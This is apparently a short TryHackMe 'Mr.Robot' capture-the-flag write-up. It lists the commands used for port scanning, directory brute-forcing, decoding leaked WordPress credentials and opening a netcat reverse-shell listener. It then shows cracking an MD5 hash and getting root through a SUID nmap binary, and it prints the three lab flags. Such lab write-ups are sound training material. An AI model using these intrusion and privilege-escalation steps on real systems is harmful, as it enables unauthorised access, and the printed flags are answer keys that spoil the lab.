# THM - Mr.Robot
- IP Target: `10.10.162.72`

## Scanning
```bash
→ ping -c 4 10.10.162.72

→ nmap -sC -sV -oN nmap.txt 10.10.162.72
```

## Brute Froce
```bash
→ gobuster dir -u http://10.10.162.72/ -w /usr/share/dirb/wordlists/common.txt 
# The first flag is keep in robots.txt/key-1-of-3.txt
# Flag_1: 073403c8a58a1f80d943455fb30724b9

# In '/license' I found this base64 encode strings "ZWxsaW90OkVSMjgtMDY1Mgo=".
→ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
# elliot:ER28-0652 => Seem to be like username and password.
# Login this page "/wp-admin"
```

## Reverse Shell
```bash
# Use netcat to reverse shell.

→ nc -lvnp 2546

python3 -c 'import pty;pty.spawn("/bin/bash")'

cat /home/robot/password.raw-md5
# Robot's hash password: c3fcd3d76192e4007dfb496cca67e13b.
# Crach hash assword: abcdefghijklmnopqrstuvwxyz

cat key-2-of-3.txt
# Flag_2: 822c73956184f694993bede3eb39f959
```

## Privilage Escalation
```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/local/bin/nmap
# Using https://gtfobins.github.io => nmap => sudo
nmap --interactive
nmap> !sh


cat /root/key-3-of-3.txt
# Flag_3: 04787ddef27c3dee1ee161b21670b4e4
```